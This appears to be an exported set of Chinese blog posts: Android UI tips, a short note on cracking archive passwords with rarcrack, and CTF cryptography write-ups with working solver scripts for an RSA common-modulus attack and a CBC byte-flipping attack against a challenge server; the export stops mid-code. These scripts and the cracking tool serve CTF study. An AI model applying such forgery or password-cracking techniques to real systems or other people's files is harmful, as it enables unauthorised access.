title="1.ScrollView使用"></a>1.ScrollView使用</h4><p>ScrollView是竖直方向上的滑动视图，水平方向可以滑动的视图的控件名叫<code>HorizontalScrollView</code></p><blockquote><p>注意：但是ScrollView控件之下只能有一个子控件，所以里面需要再嵌套一个<code>LinearLayout</code>，这样就能基本完美使用了</p></blockquote><h4 id="2-ScrollView控件隐藏滚动条"><a href="#2-ScrollView控件隐藏滚动条" class="headerlink" title="2.ScrollView控件隐藏滚动条"></a>2.ScrollView控件隐藏滚动条</h4><p>xml文件中设置SrollView的属性  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:scrollbars=&quot;none&quot;</span><br></pre></td></tr></table></figure><h3 id="控件使用"><a href="#控件使用" class="headerlink" title="控件使用"></a>控件使用</h3><h4 id="1-LinearLayout内部控件居中"><a href="#1-LinearLayout内部控件居中" class="headerlink" title="1.LinearLayout内部控件居中"></a>1.LinearLayout内部控件居中</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:layout_gravity=<span class="string">&quot;center&quot;</span></span><br></pre></td></tr></table></figure><h4 id="2-TextView点击事件"><a href="#2-TextView点击事件" class="headerlink" title="2.TextView点击事件"></a>2.TextView点击事件</h4><p>需要添加下面的属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textStyle</span>=<span class="string">&quot;bold&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textSize</span>=<span class="string">&quot;17sp&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textColor</span>=<span class="string">&quot;@color/black&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">&quot;搜索&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:clickable</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">TextView</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="安卓开发——问题及解决办法"><a href="#安卓开发——问题及解决办法" class="headerlink" title="安卓开发——问题及解决办法"></a>安卓开发——问题及解决办法</h2><h3 id="去掉应用程序上方的标题栏"><a href="#去掉应用程序上方的标题栏" class="headerlink" title="去掉应用程序上方的标题栏"></a>去掉应用程序上方的标题栏</h3><p><strong>情况一:创建的activity默认继承了AppCompatActivity</strong></p><p>方法一 &gt; 全局设置</p><p>可以在AndroidManifest.xml中作如下配置，这样就没有标题栏了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line">   android:theme=&quot;@style/Theme.AppCompat.NoActionBar&quot;&gt;</span><br></pre></td></tr></table></figure><p>方法二 &gt; 针对当前页面单独设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getSupportActionBar().hide();</span><br><span class="line">//去掉标题栏注意这句一定要写在setContentView()方法的后面</span><br></pre></td></tr></table></figure><p><img src="/2022/01/09/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20220109092525425.png" alt="使用全局方法截图"></p><p><strong>我一般都使用下面的方法,即在<code>themes.xml文件</code>里面添加下面的两句</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- top title_bar get off --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;windowNoTitle&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android:windowFullscreen&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/01/09/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20220109190840104.png" alt="效果还不错"></p><h3 id="AndroidStudio报错-W-x2F-System-err-java-io-IOException-Cleartext-HTTP-traffic-to-not-permitted"><a href="#AndroidStudio报错-W-x2F-System-err-java-io-IOException-Cleartext-HTTP-traffic-to-not-permitted" class="headerlink" title="AndroidStudio报错 W&#x2F;System.err: java.io.IOException: Cleartext HTTP traffic to  not permitted"></a>AndroidStudio报错 W&#x2F;System.err: java.io.IOException: Cleartext HTTP traffic to  not permitted</h3><blockquote><p><a href="https://blog.csdn.net/xfx_1994/article/details/121028224">解决方法参考</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux使用笔记</title>
      <link href="/2021/12/25/linux%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/12/25/linux%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="一些小工具"><a href="#一些小工具" class="headerlink" title="一些小工具"></a>一些小工具</h1><h2 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h2><p>直接安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install rarcrack</span><br></pre></td></tr></table></figure><p>使用方法为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行命令: </span><br><span class="line">rarcrack 文件名 -threads 线程数 -type rar|zip|7z</span><br></pre></td></tr></table></figure><p>我常用的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarcrack flag.zip --threads 4 --type zip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DAMNCON2021CTF</title>
      <link href="/2021/11/26/DAMNCON2021CTF/"/>
      <url>/2021/11/26/DAMNCON2021CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><p>这一块没什么好写的了什么都没有，复现的时候链接也失效了，看了调查问卷之后我才反应过来。</p><h2 id="Review-Us"><a href="#Review-Us" class="headerlink" title="Review_Us"></a>Review_Us</h2><p>调查问卷</p><p><img src="/2021/11/26/DAMNCON2021CTF//image-20211126211236171.png" alt="image-20211126211236171"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DSPH&#123;Your_Review_Matters&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The author got a message from his customer but he is unable to read it lets help him out.</span><br><span class="line">作者从他的客户那里收到一条信息，但他无法阅读，让我们帮助他。</span><br></pre></td></tr></table></figure><p>给的密文内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SGVyZSBpcyB5b3VyIG1haW4gQ2hhbGxlbmdlIQoKNm1sQS4sVTRMPDJFUTpCMSwzdXI7ZTByKDRcZV5oLT5aN0Q3UG4wbUhuXShxOyhRKl4uNEJGYkUsVFZORWJmRS5ESmB1cy5xckkqP21dMmk+W15mQz1GPUBYPiQzcGFGXURDOEVEXVAuOi8qQjFCaDppYy42aDtoNENDRHU1ITsiYzFjW05NPEFjVGgxLDNjZjllQG5IQ01HN0A3PUFgNiwlPyJMRyEoKHJHXT9rRURKYUU2RStwdDxDaG1RMkJQMXBhPzxuZGE/cy1mQTxgT0VKPUFfbXA8KVpJYDplPkxYN1M/LTpCNGFVXTUlNzo=</span><br></pre></td></tr></table></figure><p>先base64解一下码得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Here is your main Challenge!</span><br><span class="line"></span><br><span class="line">6mlA.,U4L&lt;2EQ:B1,3ur;e0r(4\e^h-&gt;Z7D7Pn0mHn](q;(Q*^.4BFbE,TVNEbfE.DJ`us.qrI*?m]2i&gt;[^fC=F=@X&gt;$3paF]DC8ED]P.:/*B1Bh:ic.6h;h4CCDu5!;&quot;c1c[NM&lt;AcTh1,3cf9e@nHCMG7@7=A`6,%?&quot;LG!((rG]?kEDJaE6E+pt&lt;ChmQ2BP1pa?&lt;nda?s-fA&lt;`OEJ=A_mp&lt;)ZI`:e&gt;LX7S?-:B4aU]5%7:</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇原战疫2021网络安全大赛-Cryptography</title>
      <link href="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography/"/>
      <url>/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography/</url>
      
        <content type="html"><![CDATA[<h2 id="低水平宣言"><a href="#低水平宣言" class="headerlink" title="低水平宣言"></a>低水平宣言</h2><p>​因为水平太低了，只刚刚研究出来了前两道密码题，应该是太简单了，签到题。但是因为是我之前从来没碰过的类型，这里记一下思路跟解题所用的脚本和常见的套路。</p><p>​下面的格密码题目终于整出来了，虽然套用的是别人的脚本，自己不太懂那个CVP函数。</p><h2 id="mostlycommon"><a href="#mostlycommon" class="headerlink" title="mostlycommon"></a>mostlycommon</h2><p>​这道题目用的是共模攻击的常见变形，亦即e1、e2不互素的共模攻击，此时应该也是可以分为多种情况的(<strong>哪种情况主要是看e1和e2的公因数的大小</strong>)，因为这里的e1与e2的公因数是2，所以如果这个m比n小很多的话，这里直接拿共模攻击(<strong>这里的共模攻击所用的e1、e2是原e1、e2与他们两个的公因数做除法之后得到的</strong>)得到的m开平方即可。<em>其他情况可能要做<strong>RSA低解密指数攻击</strong></em>。</p><p>​下面是这道题的附件脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">f = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line"><span class="string">flag = f.read()</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">p = getPrime(512)</span></span><br><span class="line"><span class="string">q = getPrime(512)</span></span><br><span class="line"><span class="string">n = p * q</span></span><br><span class="line"><span class="string">e1 = 65536</span></span><br><span class="line"><span class="string">e2 = 270270</span></span><br><span class="line"><span class="string">c1 = pow(m, e1, n)</span></span><br><span class="line"><span class="string">c2 = pow(m, e2, n)</span></span><br><span class="line"><span class="string">f = open(&#x27;message.txt&#x27;, &#x27;w&#x27;)</span></span><br><span class="line"><span class="string">f.write(&#x27;n=&#x27; + str(n) + &#x27;\n&#x27;)</span></span><br><span class="line"><span class="string">f.write(&#x27;c1=&#x27; + str(c1) + &#x27;\n&#x27;)</span></span><br><span class="line"><span class="string">f.write(&#x27;c2=&#x27; + str(c2) + &#x27;\n&#x27;)</span></span><br><span class="line"><span class="string">f.close()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>​以下是这道题目所用到的解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65536</span></span><br><span class="line">e2 = <span class="number">270270</span></span><br><span class="line">n = <span class="number">122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503</span></span><br><span class="line">c1 = <span class="number">39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673</span></span><br><span class="line">c2 = <span class="number">43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ext_euclid</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = ext_euclid(b, a % b)  <span class="comment"># q = gcd(a, b) = gcd(b, a%b)</span></span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">same_mod</span>(<span class="params">n, e1, e2, c1, c2</span>):</span><br><span class="line">    s, t, q = ext_euclid(e1, e2)</span><br><span class="line">    m = (gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n)) % n  <span class="comment"># powmod进行大数运算</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tmp = gmpy2.gcd(e1, e2)</span><br><span class="line">    e1, e2 = e1 // tmp, e2 // tmp</span><br><span class="line">    m = same_mod(n, e1, e2, c1, c2)</span><br><span class="line">    truem = gmpy2.iroot(m, tmp)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(truem))</span><br><span class="line"><span class="comment"># SETCTF&#123;now_you_master_common_mode_attack&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Civet-cat-for-Prince"><a href="#Civet-cat-for-Prince" class="headerlink" title="Civet cat for Prince"></a>Civet cat for Prince</h2><p>​很可惜啊，这道题目在比赛的时候没能做出来，比赛一结束就做出来了…主要是第一次耐着性子搞这种题目，平时基本上没搞过这种，也没学过，现在算是现学现卖，能做出来就已经不赖了.jpg，下面讲一下这道题目的主要思路哈，方便我以后的时时复习。</p><ol><li>首先是一个常见的Sha256的4位爆破。给出了4位的爆破位，简单爆破pass即可。</li><li>再就是cbc模式下的字节翻转攻击了。这种以前做过web相关的字节翻转，但是那已经是很久远的以前了，这里还是重新学，为了表示我对这个字节翻转攻击的<em>重视</em>，这里开个三级标题专门讲讲。</li></ol><h3 id="CBC字节翻转攻击-Cryptography"><a href="#CBC字节翻转攻击-Cryptography" class="headerlink" title="CBC字节翻转攻击(Cryptography)"></a>CBC字节翻转攻击(Cryptography)</h3><p>​专门在后面加了一个密码学的标签是为了到时候防止跟web的字节翻转攻击互相混淆了。这个题目极具代表性的特征是有个register的功能与</p><p><code>for i in range(3):</code>的三次选择(一次用来加密、一次用来翻转第二组明文、一次用来翻转第一组明文*&lt;通过修改初始向量iv的方式&gt;*)</p><blockquote><p>学习资源：</p><ol><li><a href="https://ctf-wiki.org/crypto/blockcipher/mode/cbc/">ctfwiki上关于块密码cbc模式的分析</a></li><li><a href="https://yoloyolo.top/2021/01/14/SWPUCTF-Crypto/">Yusa的密码学课堂 CBC第一课(详解版)</a></li><li><a href="https://writeup.ctfhub.com/Challenge/2020/SWPU-CTF-2020/Crypto/jhDNJ3rS2q5PZAS8FrUKJj.html">Yusa的密码学课堂-CBC第一课(略解版)</a></li></ol></blockquote><p>​先放一个cbc模式的图片方便后续的讲解：</p><p><img src="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography//image-20211108000631564.png"></p><p>​一般情况下(常见套路下)的CBC字节翻转攻击面对的情景都是只有两块内容的块加密，此时一般会<strong>让更改第二块明文的内容，也就是下图中红圈所圈住的内容是需要被更改的</strong></p><p><img src="/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Cryptography//image-20211108000912088.png"></p><p>​而这个密文是可以被更改的，更改所需要的条件为我们可以<strong>知道前一组的密文、所需要更改的内容更改前的明文、所需要更改的内容更改后的明文</strong>而将他们在一起异或之后获得的内容作为前一组的密文即可。原理为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果：A1=更改前第一组密文, A2=更改后第一组的密文, B1=修改前第二组的明文, B2=修改后第二组的明文, C=第二组的密文(需要保持不变)</span><br><span class="line">因为：C=A1 ^ B1</span><br><span class="line">因为：C=A2 ^ B2</span><br><span class="line">而且：C应该保持不变</span><br><span class="line">那么：A1 ^ B1 = A2 ^ B2</span><br><span class="line">那么：A2 = A1 ^ B1 ^ B2</span><br></pre></td></tr></table></figure><p>​然后把第一组的密文与第二组的密文合到一块发送个密码机，得到解密之后的内容，此时我们后面得到的明文必然已经是修改过的了(<strong>已经变成我们想要修改成为的内容了</strong>)，但是此时会发现前面的第一块明文解密出错了，这是因为第一块密文做了改变的原因。这时我们应该是已知第一块明文所需要成为的内容的，那就又变成了上面的相同的问题了，只需要修改初始向量IV的值即可，即<code>A2 = A1 ^ B1 ^ B2</code>，不过此时所求为目的IV。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A1=原来的iv, A2=目的iv, B1=修改前第一组的明文, B2=修改后第一组的明文, C=第一组的密文(需要保持不变)</span><br></pre></td></tr></table></figure><p><strong>CBC翻转攻击的条件</strong></p><ol><li><p>给出了初始iv的值，并且初始iv的值可以控制</p></li><li><p>要修改第二块明文的内容</p></li><li><p>有明文可求得一次密文</p></li><li><p>有密文可求得两次明文(且这两次解密的iv应是可控的)</p><p> 下面是做这道题用的脚本，跟屎一样，勉强凑合着用吧能</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passSha</span>():</span><br><span class="line">    sha = <span class="built_in">str</span>(p.recvline())</span><br><span class="line">    tail = sha[<span class="number">18</span>:<span class="number">26</span>]</span><br><span class="line">    targetSha = sha[<span class="number">31</span>:-<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> table:</span><br><span class="line">                    myChar = a + b + c + d + tail</span><br><span class="line">                    mySha = sha256(myChar.encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> mySha == targetSha:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Have Passed The Sha&quot;</span>)</span><br><span class="line">                        p.sendline((a + b + c + d).encode())</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    passSha()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Go away\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;[-] \n&#x27;</span>, <span class="string">b&#x27;a_cat_permission&#x27;</span>)</span><br><span class="line">    data = p.recvline_contains(<span class="string">b&#x27;Miao~ &#x27;</span>)</span><br><span class="line">    iv0 = data[<span class="number">6</span>:]</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;iv0 =&quot;</span>, iv0)  <span class="comment"># 获取返回的初始的iv值</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;3.say Goodbye\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    data = p.recvline_contains(<span class="string">b&#x27;Permission:&#x27;</span>)[<span class="number">11</span>:]</span><br><span class="line"></span><br><span class="line">    data00 = data[:<span class="number">16</span>]  <span class="comment"># ‘a_cat_permission’的加密结果</span></span><br><span class="line">    data01 = data[<span class="number">16</span>:]  <span class="comment"># &#x27;a_cat_permission&#x27;的加密结果</span></span><br><span class="line"></span><br><span class="line">    replacement0 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        replacement0 += long_to_bytes(data00[i] ^ <span class="built_in">ord</span>(<span class="string">&#x27;a_cat_permission&#x27;</span>[i]) ^ <span class="built_in">ord</span>(<span class="string">&#x27;Princepermission&#x27;</span>[i]))  <span class="comment"># 计算替换密文的值</span></span><br><span class="line">    payload0 = replacement0 + data01</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload0 =&quot;</span>, payload0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload0))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;3.say Goodbye\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(iv0)</span><br><span class="line"></span><br><span class="line">    data = p.recvline()</span><br><span class="line">    data = data[<span class="number">19</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(data), data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3</span></span><br><span class="line">    data10 = data[:<span class="number">16</span>]  <span class="comment"># 因为上面改了一个密文块而改变的明文块</span></span><br><span class="line">    data11 = data[<span class="number">16</span>:]  <span class="comment"># 一开始的输入，此时是几个a</span></span><br><span class="line"></span><br><span class="line">    iv1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data10)):</span><br><span class="line">        iv1 += long_to_bytes(data10[i] ^ iv0[i] ^ <span class="built_in">ord</span>(<span class="string">&#x27;a_cat_permission&#x27;</span>[i]))  <span class="comment"># 计算替换密文的值</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;3.say Goodbye\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(iv1)</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># getFlag</span></span><br><span class="line">    data = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    p.sendline(payload0)</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    p.sendline(iv1)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = p.recvline()</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = pwn.remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27092</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            solve()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="easytask"><a href="#easytask" class="headerlink" title="easytask"></a>easytask</h2><p>是个简单的格密码，LWE问题，下面是题目的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 